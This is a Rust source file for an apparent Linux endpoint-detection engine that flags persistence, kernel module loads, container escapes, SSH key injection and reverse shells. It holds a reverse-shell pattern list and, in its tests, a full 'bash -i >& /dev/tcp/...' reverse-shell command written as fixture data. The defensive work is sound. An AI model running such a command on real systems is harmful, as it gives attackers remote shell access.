//! Linux-specific signal detection engine
//!
//! Detects Linux-specific threats including:
//! - Cron/systemd persistence
//! - /etc/passwd and shadow file tampering
//! - Kernel module loading
//! - Container escape attempts
//! - eBPF program loading
//! - SSH key injection
//! - Privilege escalation via SUID/capabilities

use crate::signal_result::{EvidenceRef, SignalResult};
use chrono::Utc;
use edr_core::Event;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

/// Process snapshot for Linux
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcSnap {
    pub pid: u32,
    pub exe: String,
    pub cmdline: Option<String>,
    pub parent_pid: Option<u32>,
    pub parent_exe: Option<String>,
    pub uid: u32,
    pub euid: u32,
    pub capabilities: Option<String>,
    pub ts: i64,
    pub evidence: EvidenceRef,
}

/// File access snapshot
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileSnap {
    pub path: String,
    pub accessor_pid: u32,
    pub accessor_exe: String,
    pub access_type: String, // read|write|execute
    pub ts: i64,
    pub evidence: EvidenceRef,
}

/// Persistence event snapshot (cron, systemd, init.d)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PersistenceSnap {
    pub mechanism: String, // cron|systemd|init_d|rc_local
    pub path: String,
    pub content_hash: Option<String>,
    pub user: Option<String>,
    pub ts: i64,
    pub evidence: EvidenceRef,
}

/// Kernel module load snapshot
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KmodSnap {
    pub module_name: String,
    pub loader_pid: u32,
    pub loader_exe: String,
    pub ts: i64,
    pub evidence: EvidenceRef,
}

/// Container event snapshot
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ContainerSnap {
    pub container_id: String,
    pub event_type: String, // escape_attempt|privileged_container|host_mount
    pub detail: String,
    pub ts: i64,
    pub evidence: EvidenceRef,
}

/// SSH event snapshot
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SshSnap {
    pub event_type: String, // key_added|session_start|brute_force
    pub user: String,
    pub source_ip: Option<String>,
    pub ts: i64,
    pub evidence: EvidenceRef,
}

/// Network connection snapshot
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NetSnap {
    pub pid: u32,
    pub exe: String,
    pub dest_ip: String,
    pub dest_port: u16,
    pub ts: i64,
    pub evidence: EvidenceRef,
}

/// Privilege escalation snapshot
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PrivEscSnap {
    pub method: String, // suid|capability|sudo|pkexec
    pub target_exe: String,
    pub user: String,
    pub ts: i64,
    pub evidence: EvidenceRef,
}

/// Linux Signal Detection Engine
pub struct LinuxSignalEngine {
    host: String,
    // State tracking with TTL
    proc_by_pid: HashMap<u32, ProcSnap>,
    file_access: Vec<FileSnap>,
    persistence_events: Vec<PersistenceSnap>,
    kmod_loads: Vec<KmodSnap>,
    container_events: Vec<ContainerSnap>,
    ssh_events: Vec<SshSnap>,
    net_by_pid: HashMap<u32, Vec<NetSnap>>,
    priv_esc_events: Vec<PrivEscSnap>,
    // Dedup tracking
    last_fired: HashMap<String, i64>,
}

impl LinuxSignalEngine {
    pub fn new(host: String) -> Self {
        Self {
            host,
            proc_by_pid: HashMap::new(),
            file_access: Vec::new(),
            persistence_events: Vec::new(),
            kmod_loads: Vec::new(),
            container_events: Vec::new(),
            ssh_events: Vec::new(),
            net_by_pid: HashMap::new(),
            priv_esc_events: Vec::new(),
            last_fired: HashMap::new(),
        }
    }

    /// Process incoming canonical event, return detected signals
    pub fn process_event(&mut self, event: &Event) -> Vec<SignalResult> {
        let now = Utc::now().timestamp_millis();
        let mut signals = Vec::new();

        // Compact old entries
        self.compact(now);

        // Route event based on tags
        for tag in &event.tags {
            match tag.as_str() {
                "process" | "exec" => self.handle_process(event, now, &mut signals),
                "file_write" | "file_create" => self.handle_file_write(event, now, &mut signals),
                "persistence" | "cron" | "systemd" => {
                    self.handle_persistence(event, now, &mut signals)
                }
                "kernel_module" | "kmod" => self.handle_kmod(event, now, &mut signals),
                "container" => self.handle_container(event, now, &mut signals),
                "ssh" | "auth" => self.handle_ssh(event, now, &mut signals),
                "network" => self.handle_network(event, now, &mut signals),
                "privilege_escalation" | "setuid" | "capability" => {
                    self.handle_priv_esc(event, now, &mut signals)
                }
                _ => {}
            }
        }

        signals
    }

    fn handle_process(&mut self, event: &Event, now: i64, signals: &mut Vec<SignalResult>) {
        let pid = event
            .fields
            .get("pid")
            .and_then(|v| v.as_u64())
            .unwrap_or(0) as u32;
        let exe = event
            .fields
            .get("exe")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let uid = event
            .fields
            .get("uid")
            .and_then(|v| v.as_u64())
            .unwrap_or(0) as u32;
        let euid = event
            .fields
            .get("euid")
            .and_then(|v| v.as_u64())
            .unwrap_or(uid as u64) as u32;

        let snap = ProcSnap {
            pid,
            exe: exe.clone(),
            cmdline: event
                .fields
                .get("cmdline")
                .and_then(|v| v.as_str())
                .map(|s| s.to_string()),
            parent_pid: event
                .fields
                .get("ppid")
                .and_then(|v| v.as_u64())
                .map(|p| p as u32),
            parent_exe: event
                .fields
                .get("parent_exe")
                .and_then(|v| v.as_str())
                .map(|s| s.to_string()),
            uid,
            euid,
            capabilities: event
                .fields
                .get("capabilities")
                .and_then(|v| v.as_str())
                .map(|s| s.to_string()),
            ts: now,
            evidence: self.make_evidence(event),
        };

        if pid > 0 {
            // Detect suspicious executables
            self.detect_suspicious_exec(&snap, signals);

            // Detect reverse shells
            self.detect_reverse_shell(&snap, signals);

            // Detect privilege escalation via uid/euid mismatch
            if uid != euid && euid == 0 {
                self.detect_suid_escalation(&snap, signals);
            }

            self.proc_by_pid.insert(pid, snap);
        }
    }

    fn handle_file_write(&mut self, event: &Event, now: i64, signals: &mut Vec<SignalResult>) {
        let path = event
            .fields
            .get("path")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let pid = event
            .fields
            .get("pid")
            .and_then(|v| v.as_u64())
            .unwrap_or(0) as u32;

        let snap = FileSnap {
            path: path.clone(),
            accessor_pid: pid,
            accessor_exe: event
                .fields
                .get("exe")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string(),
            access_type: "write".to_string(),
            ts: now,
            evidence: self.make_evidence(event),
        };

        // Detect writes to critical files
        if self.is_critical_file(&path) {
            self.detect_critical_file_write(&snap, signals);
        }

        self.file_access.push(snap);
    }

    fn handle_persistence(&mut self, event: &Event, now: i64, signals: &mut Vec<SignalResult>) {
        let mechanism = if event.tags.contains(&"cron".to_string()) {
            "cron"
        } else if event.tags.contains(&"systemd".to_string()) {
            "systemd"
        } else {
            "unknown"
        };

        let path = event
            .fields
            .get("path")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();

        let snap = PersistenceSnap {
            mechanism: mechanism.to_string(),
            path: path.clone(),
            content_hash: event
                .fields
                .get("content_hash")
                .and_then(|v| v.as_str())
                .map(|s| s.to_string()),
            user: event.identity_key.clone(),
            ts: now,
            evidence: self.make_evidence(event),
        };

        // Signal on persistence mechanism creation
        let entity_hash = format!("{}:{}", mechanism, path);
        if self.should_fire(&entity_hash, "PersistenceMechanism", now) {
            let mut signal = SignalResult::new(
                &self.host,
                &format!("Persistence{}", Self::capitalize(mechanism)),
                "high",
                &entity_hash,
                now,
            );
            signal.file_key = Some(path);
            signal.evidence_ptrs.push(snap.evidence.clone());
            signal.metadata = serde_json::json!({
                "mechanism": mechanism,
            });
            signals.push(signal);
            self.last_fired
                .insert(format!("PersistenceMechanism|{}", entity_hash), now);
        }

        self.persistence_events.push(snap);
    }

    fn handle_kmod(&mut self, event: &Event, now: i64, signals: &mut Vec<SignalResult>) {
        let module_name = event
            .fields
            .get("module")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let pid = event
            .fields
            .get("pid")
            .and_then(|v| v.as_u64())
            .unwrap_or(0) as u32;

        let snap = KmodSnap {
            module_name: module_name.clone(),
            loader_pid: pid,
            loader_exe: event
                .fields
                .get("exe")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string(),
            ts: now,
            evidence: self.make_evidence(event),
        };

        // Always signal on kernel module loads (high severity event)
        let entity_hash = format!("kmod:{}", module_name);
        if self.should_fire(&entity_hash, "KernelModule", now) {
            let mut signal = SignalResult::new(
                &self.host,
                "KernelModuleLoad",
                "critical",
                &entity_hash,
                now,
            );
            signal.proc_key = Some(format!("proc_{}", pid));
            signal.evidence_ptrs.push(snap.evidence.clone());
            signal.metadata = serde_json::json!({
                "module_name": module_name,
                "loader_exe": snap.loader_exe,
            });
            signals.push(signal);
            self.last_fired
                .insert(format!("KernelModule|{}", entity_hash), now);
        }

        self.kmod_loads.push(snap);
    }

    fn handle_container(&mut self, event: &Event, now: i64, signals: &mut Vec<SignalResult>) {
        let container_id = event
            .fields
            .get("container_id")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let event_type = event
            .fields
            .get("container_event")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();

        let snap = ContainerSnap {
            container_id: container_id.clone(),
            event_type: event_type.clone(),
            detail: event
                .fields
                .get("detail")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string(),
            ts: now,
            evidence: self.make_evidence(event),
        };

        // Detect container escape attempts
        if event_type == "escape_attempt" || event_type == "privileged_container" {
            let entity_hash = format!("container:{}:{}", container_id, event_type);
            if self.should_fire(&entity_hash, "ContainerEscape", now) {
                let severity = if event_type == "escape_attempt" {
                    "critical"
                } else {
                    "high"
                };
                let mut signal = SignalResult::new(
                    &self.host,
                    "ContainerSecurityEvent",
                    severity,
                    &entity_hash,
                    now,
                );
                signal.evidence_ptrs.push(snap.evidence.clone());
                signal.metadata = serde_json::json!({
                    "container_id": container_id,
                    "event_type": event_type,
                    "detail": snap.detail,
                });
                signals.push(signal);
                self.last_fired
                    .insert(format!("ContainerEscape|{}", entity_hash), now);
            }
        }

        self.container_events.push(snap);
    }

    fn handle_ssh(&mut self, event: &Event, now: i64, signals: &mut Vec<SignalResult>) {
        let event_type = event
            .fields
            .get("ssh_event")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let user = event.identity_key.clone().unwrap_or_default();

        let snap = SshSnap {
            event_type: event_type.clone(),
            user: user.clone(),
            source_ip: event
                .fields
                .get("source_ip")
                .and_then(|v| v.as_str())
                .map(|s| s.to_string()),
            ts: now,
            evidence: self.make_evidence(event),
        };

        // Detect SSH key injection
        if event_type == "key_added" {
            let entity_hash = format!(
                "ssh_key:{}:{}",
                user,
                snap.source_ip.as_deref().unwrap_or("local")
            );
            if self.should_fire(&entity_hash, "SshKeyInjection", now) {
                let mut signal =
                    SignalResult::new(&self.host, "SshKeyInjection", "high", &entity_hash, now);
                signal.identity_key = Some(user.clone());
                signal.evidence_ptrs.push(snap.evidence.clone());
                signal.metadata = serde_json::json!({
                    "user": user,
                    "source_ip": snap.source_ip,
                });
                signals.push(signal);
                self.last_fired
                    .insert(format!("SshKeyInjection|{}", entity_hash), now);
            }
        }

        self.ssh_events.push(snap);
    }

    fn handle_network(&mut self, event: &Event, now: i64, _signals: &mut Vec<SignalResult>) {
        let pid = event
            .fields
            .get("pid")
            .and_then(|v| v.as_u64())
            .unwrap_or(0) as u32;
        let exe = event
            .fields
            .get("exe")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let dest_ip = event
            .fields
            .get("dest_ip")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let dest_port = event
            .fields
            .get("dest_port")
            .and_then(|v| v.as_u64())
            .unwrap_or(0) as u16;

        let snap = NetSnap {
            pid,
            exe,
            dest_ip,
            dest_port,
            ts: now,
            evidence: self.make_evidence(event),
        };

        if pid > 0 {
            self.net_by_pid
                .entry(pid)
                .or_insert_with(Vec::new)
                .push(snap);
        }
    }

    fn handle_priv_esc(&mut self, event: &Event, now: i64, signals: &mut Vec<SignalResult>) {
        let method = if event.tags.contains(&"setuid".to_string()) {
            "suid"
        } else if event.tags.contains(&"capability".to_string()) {
            "capability"
        } else {
            "unknown"
        };

        let target_exe = event
            .fields
            .get("exe")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let user = event.identity_key.clone().unwrap_or_default();

        let snap = PrivEscSnap {
            method: method.to_string(),
            target_exe: target_exe.clone(),
            user: user.clone(),
            ts: now,
            evidence: self.make_evidence(event),
        };

        // Signal on privilege escalation
        let entity_hash = format!("priv_esc:{}:{}:{}", method, user, target_exe);
        if self.should_fire(&entity_hash, "PrivilegeEscalation", now) {
            let mut signal = SignalResult::new(
                &self.host,
                "PrivilegeEscalation",
                "critical",
                &entity_hash,
                now,
            );
            signal.identity_key = Some(user.clone());
            signal.evidence_ptrs.push(snap.evidence.clone());
            signal.metadata = serde_json::json!({
                "method": method,
                "target_exe": target_exe,
                "user": user,
            });
            signals.push(signal);
            self.last_fired
                .insert(format!("PrivilegeEscalation|{}", entity_hash), now);
        }

        self.priv_esc_events.push(snap);
    }

    // Detection helpers

    fn detect_suspicious_exec(&mut self, snap: &ProcSnap, signals: &mut Vec<SignalResult>) {
        // Detect execution from world-writable directories
        let suspicious_paths = ["/tmp/", "/var/tmp/", "/dev/shm/"];
        if suspicious_paths.iter().any(|p| snap.exe.starts_with(p)) {
            let entity_hash = format!("suspicious_path:{}", snap.exe);
            if self.should_fire(&entity_hash, "SuspiciousExec", snap.ts) {
                let mut signal = SignalResult::new(
                    &self.host,
                    "SuspiciousPathExecution",
                    "high",
                    &entity_hash,
                    snap.ts,
                );
                signal.proc_key = Some(format!("proc_{}", snap.pid));
                signal.evidence_ptrs.push(snap.evidence.clone());
                signal.metadata = serde_json::json!({
                    "exe": snap.exe,
                    "uid": snap.uid,
                });
                signals.push(signal);
                self.last_fired
                    .insert(format!("SuspiciousExec|{}", entity_hash), snap.ts);
            }
        }
    }

    fn detect_reverse_shell(&mut self, snap: &ProcSnap, signals: &mut Vec<SignalResult>) {
        if let Some(cmdline) = &snap.cmdline {
            // Common reverse shell patterns
            let patterns = [
                "bash -i",
                "/dev/tcp/",
                "nc -e",
                "python -c",
                "perl -e",
                "mkfifo",
            ];
            if patterns.iter().any(|p| cmdline.contains(p)) {
                let entity_hash = format!("reverse_shell:{}", snap.pid);
                if self.should_fire(&entity_hash, "ReverseShell", snap.ts) {
                    let mut signal = SignalResult::new(
                        &self.host,
                        "ReverseShellDetected",
                        "critical",
                        &entity_hash,
                        snap.ts,
                    );
                    signal.proc_key = Some(format!("proc_{}", snap.pid));
                    signal.evidence_ptrs.push(snap.evidence.clone());
                    signal.metadata = serde_json::json!({
                        "exe": snap.exe,
                        "cmdline": cmdline,
                    });
                    signals.push(signal);
                    self.last_fired
                        .insert(format!("ReverseShell|{}", entity_hash), snap.ts);
                }
            }
        }
    }

    fn detect_suid_escalation(&mut self, snap: &ProcSnap, signals: &mut Vec<SignalResult>) {
        let entity_hash = format!("suid_esc:{}:{}", snap.uid, snap.exe);
        if self.should_fire(&entity_hash, "SuidEscalation", snap.ts) {
            let mut signal = SignalResult::new(
                &self.host,
                "SuidPrivilegeEscalation",
                "high",
                &entity_hash,
                snap.ts,
            );
            signal.proc_key = Some(format!("proc_{}", snap.pid));
            signal.evidence_ptrs.push(snap.evidence.clone());
            signal.metadata = serde_json::json!({
                "exe": snap.exe,
                "uid": snap.uid,
                "euid": snap.euid,
            });
            signals.push(signal);
            self.last_fired
                .insert(format!("SuidEscalation|{}", entity_hash), snap.ts);
        }
    }

    fn detect_critical_file_write(&mut self, snap: &FileSnap, signals: &mut Vec<SignalResult>) {
        let entity_hash = format!("critical_write:{}", snap.path);
        if self.should_fire(&entity_hash, "CriticalFileWrite", snap.ts) {
            let mut signal = SignalResult::new(
                &self.host,
                "CriticalFileModification",
                "critical",
                &entity_hash,
                snap.ts,
            );
            signal.file_key = Some(snap.path.clone());
            signal.proc_key = Some(format!("proc_{}", snap.accessor_pid));
            signal.evidence_ptrs.push(snap.evidence.clone());
            signal.metadata = serde_json::json!({
                "path": snap.path,
                "accessor_exe": snap.accessor_exe,
            });
            signals.push(signal);
            self.last_fired
                .insert(format!("CriticalFileWrite|{}", entity_hash), snap.ts);
        }
    }

    // Helper methods

    fn make_evidence(&self, event: &Event) -> EvidenceRef {
        match &event.evidence_ptr {
            Some(ptr) => EvidenceRef {
                stream_id: ptr.stream_id.clone(),
                segment_id: ptr.segment_id.to_string(),
                record_index: ptr.record_index as u64,
            },
            None => EvidenceRef::default(),
        }
    }

    fn should_fire(&self, entity_hash: &str, signal_type: &str, now: i64) -> bool {
        let key = format!("{}|{}", signal_type, entity_hash);
        match self.last_fired.get(&key) {
            Some(last_ts) => (now - last_ts) > 300_000, // 5 minute cooldown
            None => true,
        }
    }

    fn is_critical_file(&self, path: &str) -> bool {
        let critical_files = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/sudoers",
            "/etc/ssh/sshd_config",
            "/root/.ssh/authorized_keys",
            "/etc/crontab",
            "/etc/ld.so.preload",
        ];
        critical_files
            .iter()
            .any(|f| path == *f || path.starts_with(&format!("{}/", f)))
    }

    fn capitalize(s: &str) -> String {
        let mut c = s.chars();
        match c.next() {
            None => String::new(),
            Some(f) => f.to_uppercase().collect::<String>() + c.as_str(),
        }
    }

    fn compact(&mut self, now: i64) {
        const TTL_PROC: i64 = 2 * 60 * 60 * 1000; // 2 hours
        const TTL_FILE: i64 = 30 * 60 * 1000; // 30 minutes
        const TTL_PERSISTENCE: i64 = 60 * 60 * 1000; // 1 hour
        const TTL_KMOD: i64 = 60 * 60 * 1000; // 1 hour
        const TTL_CONTAINER: i64 = 30 * 60 * 1000; // 30 minutes
        const TTL_SSH: i64 = 60 * 60 * 1000; // 1 hour

        self.proc_by_pid.retain(|_, snap| now - snap.ts < TTL_PROC);
        self.file_access.retain(|snap| now - snap.ts < TTL_FILE);
        self.persistence_events
            .retain(|snap| now - snap.ts < TTL_PERSISTENCE);
        self.kmod_loads.retain(|snap| now - snap.ts < TTL_KMOD);
        self.container_events
            .retain(|snap| now - snap.ts < TTL_CONTAINER);
        self.ssh_events.retain(|snap| now - snap.ts < TTL_SSH);
        self.priv_esc_events.retain(|snap| now - snap.ts < TTL_PROC);

        for snaps in self.net_by_pid.values_mut() {
            snaps.retain(|snap| now - snap.ts < TTL_PROC);
        }
        self.net_by_pid.retain(|_, snaps| !snaps.is_empty());

        // Clean old dedup entries
        self.last_fired.retain(|_, ts| now - *ts < TTL_PROC);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use edr_core::EvidencePtr;
    use std::collections::BTreeMap;

    fn make_test_event(tags: Vec<&str>, fields_json: serde_json::Value) -> Event {
        let mut fields = BTreeMap::new();
        if let Some(obj) = fields_json.as_object() {
            for (k, v) in obj {
                fields.insert(k.clone(), v.clone());
            }
        }
        Event {
            ts_ms: chrono::Utc::now().timestamp_millis(),
            host: "TEST_HOST".to_string(),
            tags: tags.into_iter().map(|s| s.to_string()).collect(),
            fields,
            proc_key: Some("proc_1234".to_string()),
            file_key: None,
            identity_key: Some("user1".to_string()),
            evidence_ptr: Some(EvidencePtr {
                stream_id: "test_stream".to_string(),
                segment_id: 0,
                record_index: 0,
            }),
        }
    }

    #[test]
    fn test_engine_creation() {
        let engine = LinuxSignalEngine::new("TEST_HOST".to_string());
        assert_eq!(engine.host, "TEST_HOST");
    }

    #[test]
    fn test_kernel_module_detection() {
        let mut engine = LinuxSignalEngine::new("TEST_HOST".to_string());
        let event = make_test_event(
            vec!["kernel_module"],
            serde_json::json!({
                "module": "evil_rootkit",
                "pid": 1234,
                "exe": "/usr/bin/insmod"
            }),
        );

        let signals = engine.process_event(&event);
        assert!(!signals.is_empty());
        assert_eq!(signals[0].signal_type, "KernelModuleLoad");
        assert_eq!(signals[0].severity, "critical");
    }

    #[test]
    fn test_critical_file_write() {
        let mut engine = LinuxSignalEngine::new("TEST_HOST".to_string());
        let event = make_test_event(
            vec!["file_write"],
            serde_json::json!({
                "path": "/etc/passwd",
                "pid": 1234,
                "exe": "/tmp/malware"
            }),
        );

        let signals = engine.process_event(&event);
        assert!(!signals.is_empty());
        assert_eq!(signals[0].signal_type, "CriticalFileModification");
    }

    #[test]
    fn test_reverse_shell_detection() {
        let mut engine = LinuxSignalEngine::new("TEST_HOST".to_string());
        let event = make_test_event(
            vec!["exec"],
            serde_json::json!({
                "pid": 1234,
                "exe": "/bin/bash",
                "cmdline": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
            }),
        );

        let signals = engine.process_event(&event);
        assert!(!signals.is_empty());
        assert_eq!(signals[0].signal_type, "ReverseShellDetected");
    }
}
